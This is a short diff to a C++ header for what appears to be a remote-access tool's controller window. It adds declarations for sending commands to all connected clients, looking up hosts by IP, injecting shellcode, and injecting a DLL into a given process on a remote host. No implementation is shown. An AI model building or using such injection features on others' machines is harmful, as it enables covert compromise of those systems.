@@ -211,6 +211,7 @@ public:
     static BOOL CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
     VOID MessageHandle(CONTEXT_OBJECT* ContextObject);
     VOID SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength);
+    VOID SendAllCommand(PBYTE  szBuffer, ULONG ulLength);
     // 显示用户上线信息
     CWnd* m_pFloatingTip = nullptr;
     CListCtrl  m_CList_Online;
@@ -225,6 +226,8 @@ public:
     CTrueColorToolBar m_ToolBar;
     CGridDialog * m_gridDlg = NULL;
     std::vector<DllInfo*> m_DllList;
+    context* FindHostByIP(const std::string& ip);
+    void InjectTinyRunDll(const std::string& ip, int pid);
     NOTIFYICONDATA  m_Nid;
     HANDLE m_hExit;
     CRITICAL_SECTION m_cs;
@@ -296,6 +299,11 @@ public:
     afx_msg LRESULT OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam);
     afx_msg LRESULT OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam);
     afx_msg LRESULT UPXProcResult(WPARAM wParam, LPARAM lParam);
+    afx_msg LRESULT InjectShellcode(WPARAM wParam, LPARAM lParam);
+    afx_msg LRESULT ShareClient(WPARAM wParam, LPARAM lParam);
+    LRESULT assignFunction(WPARAM wParam, LPARAM lParam, BOOL all);
+    afx_msg LRESULT AssignClient(WPARAM wParam, LPARAM lParam);
+    afx_msg LRESULT AssignAllClient(WPARAM wParam, LPARAM lParam);
     afx_msg BOOL OnHelpInfo(HELPINFO* pHelpInfo);
     virtual BOOL PreTranslateMessage(MSG* pMsg);
     afx_msg void OnOnlineShare();
